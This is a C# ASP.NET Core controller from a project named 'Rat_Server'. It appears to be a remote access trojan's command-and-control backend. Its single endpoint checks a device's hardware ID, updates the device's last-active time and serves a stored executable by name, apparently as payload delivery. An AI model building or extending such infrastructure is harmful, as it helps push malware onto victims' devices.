using Microsoft.AspNetCore.Http;
using Microsoft.AspNetCore.Mvc;
using Microsoft.EntityFrameworkCore;
using Rat_Server.Model.Context;
using Rat_Server.Model.Entities;
using System.Linq.Expressions;
using static Org.BouncyCastle.Math.EC.ECCurve;

namespace Rat_Server.Controllers
{
    [Route("api/[controller]")]
    [ApiController]
    public class ExeFileController : ControllerBase
    {
        private readonly RatDbContext _context;
        private readonly IConfiguration _config;

        public ExeFileController(RatDbContext context, IConfiguration config)
        {
            _context = context;
            _config = config;
        }

        [HttpGet("GetExeFile/{Name}")]
        [ProducesResponseType<ExeFile>(StatusCodes.Status200OK)]
        [ProducesResponseType(StatusCodes.Status401Unauthorized)]
        [ProducesResponseType(StatusCodes.Status404NotFound)]
        public async Task<IActionResult> GetExeFile([FromHeader] Guid Hwid, string Name)
        {
            Device? device = await _context.Devices.SingleOrDefaultAsync(d => d.Hwid == Hwid);
            if(device == null)
            {
                return Unauthorized();
            }
            else
            {
                device.LastActive = DateTime.Now;
                await _context.SaveChangesAsync();
            }

            ExeFile? exeFile = await _context.ExeFiles.SingleOrDefaultAsync(e => e.Name == Name);
            if(exeFile == null)
            {
                return NotFound();
            }

            return Ok(exeFile);
        }
    }
}
